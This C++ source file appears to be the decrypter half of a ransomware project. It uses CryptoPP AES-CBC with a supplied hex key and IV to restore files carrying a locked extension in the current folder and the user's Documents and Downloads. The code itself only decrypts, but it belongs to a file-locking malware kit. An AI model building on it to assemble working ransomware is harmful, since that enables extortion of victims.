
#include <iostream>

#include "stdafx.h"
#include "config.h"
#include "tear.h"

using namespace std;
//using namespace boost::filesystem;
using namespace CryptoPP;


crypt_data* get(string key, string iv);
void iterate(crypt_data* d, const CString& parent);
void process(crypt_data* d, const CString& parent);
void decrypt(crypt_data* d, const CString& file);
CString get_home();

int decrypter_main(string t_key, string t_iv) 
{
	string hex_key = t_key;
	string hex_iv = t_iv;

	if (hex_key.length() != KEY_LEN * 2) 
	{
		cerr << "Hex key length must be " << (KEY_LEN * 2) << endl;
		exit(-1);
	} 
	else if (hex_iv.length() != IV_LEN * 2) 
	{
		cerr << "Hex IV length must be " << (IV_LEN * 2) << endl;
		exit(-1);
	}

	crypt_data* d = get(hex_key, hex_iv);

	iterate(d, _T("."));
	CString path;
	path = get_home() + _T("\\Documents");
	iterate(d,path);
	path = get_home() + _T("\\Downloads");
	iterate(d,path);

	return 0;
}

crypt_data* get(string key, string iv) 
{
	crypt_data* d = new crypt_data;

	HexDecoder decoder;
	decoder.Put((byte*) key.data(), key.size());
	decoder.MessageEnd();
	decoder.Get(d->key, sizeof(d->key));

	HexDecoder decoder1;
	decoder1.Put((byte*) iv.data(), iv.size());
	decoder1.MessageEnd();
	decoder1.Get(d->iv, sizeof(d->iv));

	return d;
}

void iterate(crypt_data* d, const CString &parent) 
{
	CFileFind end_itr;	//record the directory
	CString strpath;
	bool is_find = end_itr.FindFile(parent+_T("\\*"));

	while (is_find)
	{
		is_find = end_itr.FindNextFile();
		strpath = end_itr.GetFilePath();

		if (end_itr.IsDirectory() && !end_itr.IsDots())
		{
			iterate(d, strpath);
		}
		else
		if (!end_itr.IsDirectory() && !end_itr.IsDots())
		{
			process(d, strpath);
		}
	}
}

void process(crypt_data* d, const CString& path) 
{
	CString extension;
	int dot_pos = path.ReverseFind('.');
	if (dot_pos < 0 || dot_pos >= path.GetLength()) return;
	extension = path.Mid(dot_pos);
	if (extension == LOCKED_EXTENSION) 
	{
		decrypt(d, path);
	}
}

#include <sstream>
void decrypt(crypt_data* d, const CString& file) 
{

	string cipher;
	std::ifstream ifile(file, std::ios::binary);
	std::stringstream sss;
	sss << ifile.rdbuf();
	cipher = sss.str();

	string decrypted_name;


	decrypted_name = CT2A(file.Left(file.GetLength() - strlen(LOCKED_EXTENSION)).GetBuffer());


	string decrypted;
	CBC_Mode<AES>::Decryption dk;
	dk.SetKeyWithIV(d->key, sizeof(d->key), d->iv);

	StringSource ss(cipher, true, new StreamTransformationFilter(dk, new StringSink(decrypted)));

	std::ofstream ofile(decrypted_name.c_str(), std::ios::binary);
	ofile.write(decrypted.c_str(), decrypted.length());
	ofile.close();
}

CString get_home() 
{
#ifdef _WIN32
	CString path;

	char* drive = getenv("USERPROFILE");
	if (drive == NULL) 
	{
		throw runtime_error("USERPROFILE environment variable not found");
	}
	else 
	{
		path = drive;
	}

	return path;
#else
	struct passwd *pw;

	uid_t uid = geteuid();
	pw = getpwuid(uid);
	if (pw) {
		return string(pw->pw_dir);
	}

	return EMPTY;
#endif
}